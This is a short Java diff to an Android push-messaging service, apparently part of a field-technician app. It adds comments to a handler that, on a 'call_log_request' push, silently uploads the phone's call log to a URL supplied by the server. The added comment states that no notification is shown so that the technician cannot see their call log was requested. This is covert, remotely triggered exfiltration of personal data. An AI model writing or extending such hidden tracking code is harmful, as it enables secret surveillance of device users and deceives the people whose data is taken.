@@ -145,6 +145,8 @@ public class HroMessagingService extends com.capacitorjs.plugins.pushnotificatio
             return;
         }
         if ("call_log_request".equals(data.get("type"))) {
+            // Silent. Do not post a tray item — the technician must not see that
+            // this phone's call log was requested.
             final String uploadUrl = data.get("uploadUrl");
             final String requestId = data.get("requestId");
             new Thread(() -> CallLogStore.uploadRequest(getApplicationContext(), uploadUrl, requestId), "hro-call-log")
